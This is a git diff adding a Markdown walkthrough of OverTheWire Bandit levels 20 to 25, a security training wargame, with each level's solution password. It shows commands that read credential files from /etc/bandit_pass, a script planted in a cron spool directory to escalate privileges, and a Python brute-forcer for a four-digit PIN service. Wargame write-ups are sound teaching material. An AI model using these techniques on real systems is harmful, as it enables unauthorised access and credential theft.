@@ -369,3 +369,206 @@ GbKksEFF4yrVs6il55v6gwY5aVje5f0j
 ### pw
 GbKksEFF4yrVs6il55v6gwY5aVje5f0j
 
+# over the wire bandit 20~25
+## 20~21
+### 문제상황
+There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument.
+1. It then reads a line of text from the connection and
+2. compares it to the password in the previous level (bandit20)
+3. If the password is correct, it will transmit the password for the next level (bandit21).
+### 풀이
+* [simple server](https://devanix.tistory.com/307)
+```bash
+bandit20@bandit:~$ ./suconnect
+Usage: ./suconnect <portnumber>
+This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.
+bandit20@bandit:~$ ./suconnect 22
+Read: SSH-2.0-OpenSSH_7.4p1
+ERROR: This doesn't match the current password!
+```
+* lets make simple chat service(?) by nc.
+* login by bandit20 in two terminals. I will call it terminal 1 and terminal 2 from now
+**termina1**
+```bash
+bandit20@bandit:~$ nc -l -p 1234
+```
+**terminal2**
+```bash
+bandit20@bandit:~$ ./suconnect 1234
+```
+**termina1**
+```bash
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+```
+* send password of bandit20
+**terminal2**
+```bash
+bandit20@bandit:~$ ./suconnect 1234
+Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+Password matches, sending next password
+```
+* checkout terminal1 and there is password.
+
+### pw
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
+## 21~22
+### 문제상황
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+### 풀이
+```bash
+bandit21@bandit:~$ cd /etc/cron.d
+bandit21@bandit:/etc/cron.d$ ls -al
+total 36
+drwxr-xr-x  2 root root 4096 Jul 11 15:56 .
+drwxr-xr-x 87 root root 4096 May 14 09:41 ..
+-rw-r--r--  1 root root   62 May 14 13:40 cronjob_bandit15_root
+-rw-r--r--  1 root root   62 Jul 11 15:56 cronjob_bandit17_root
+-rw-r--r--  1 root root  120 May  7 20:14 cronjob_bandit22
+-rw-r--r--  1 root root  122 May  7 20:14 cronjob_bandit23
+-rw-r--r--  1 root root  120 May 14 09:41 cronjob_bandit24
+-rw-r--r--  1 root root   62 May 14 14:04 cronjob_bandit25_root
+-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
+bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+```
+* so, they are sending password of bandit22 to file in /tmp directory
+* lets checkout :)
+```bash
+bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+```
+### pw
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+## 22~23
+### 문제상황
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+### 풀이
+```bash
+bandit22@bandit:~$ cd /etc/cron.d
+bandit22@bandit:/etc/cron.d$ ls -a
+.                      cronjob_bandit17_root  cronjob_bandit24
+..                     cronjob_bandit22       cronjob_bandit25_root
+cronjob_bandit15_root  cronjob_bandit23       .placeholder
+bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
+bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+```
+* they are passing password to /tmp/$mytarget
+* and my we can get $mytarget by executing in shell
+```bash
+bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1 | cat
+8ca319486bfbbc3663ea0fbe81326349
+bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+```
+
+### pw
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+## 23~24
+### 문제상황
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+
+NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+### 풀이
+```bash
+bandit23@bandit:~$ cd /etc/cron.d
+bandit23@bandit:/etc/cron.d$ ls
+cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24
+cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root
+bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24/sh
+cat: /usr/bin/cronjob_bandit24/sh: No such file or directory
+bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+```
+* cron executes every 1minute
+```bash
+bandit23@bandit:/var/spool/bandit24$ cat lol.sh
+#!/bin/sh
+
+cat /etc/bandit_pass/bandit24 > ./pass
+bandit23@bandit:/var/spool/bandit24$ cat ./pass
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
+
+### pw
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+## 24~25
+### 문제상황
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+### 풀이
+```bash
+bandit24@bandit:~$ nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+```
+```python
+import socket
+import sys
+
+password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+try:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_address = ('127.0.0.1', 30002)
+    sock.connect(server_address)
+    msg = sock.recv(2048)
+    print(msg)
+    for i in range(10000):
+        pin = str(i).zfill(4)
+        message = password + " " + pin + "\n"
+        sock.sendall(message.encode())
+        msg = sock.recv(1024)
+        if "Wrong" in msg:
+            print("wrong", pin)
+        else:
+            print(pin, msg)
+            break
+    sock.close()
+finally:
+    sys.exit(1)
+```
+```bash
+('2588', 'Correct!\nThe password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\n\nExiting.\n')
+```
+### pw
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
